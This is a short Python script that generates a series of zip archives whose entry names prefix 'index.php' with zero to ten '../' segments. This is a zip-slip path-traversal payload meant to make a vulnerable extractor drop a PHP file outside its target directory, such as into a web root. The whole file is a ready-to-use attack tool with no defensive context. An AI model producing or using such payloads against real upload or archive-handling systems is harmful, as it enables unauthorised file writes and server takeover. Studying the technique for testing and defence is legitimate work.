#!/usr/bin/env python3

import zipfile

# The file to USE inside the zip, before compression
filein = "index.php"
print("[i] FileIn: %s\n" % filein)

# How deep are we going?
depth = ""

# Loop 11 times (00-10)
for i in range(11):
  # The .zip file to use
  zipname = "depth-%02d.zip" % i
  print("[i] ZipName: %s" % zipname)

  # Get the zip file out ready
  with zipfile.ZipFile(zipname , 'w') as zip:
  	# The file INSIDDE the zip
    filezip = "%s%s" % (depth, filein)
    print("[i] ZipFile: %s" % filezip)

    # Write the zip file out
    zip.write(filein, filezip)

    # Increase depth for next loop
    depth += "../"

print("\n[i] Done")
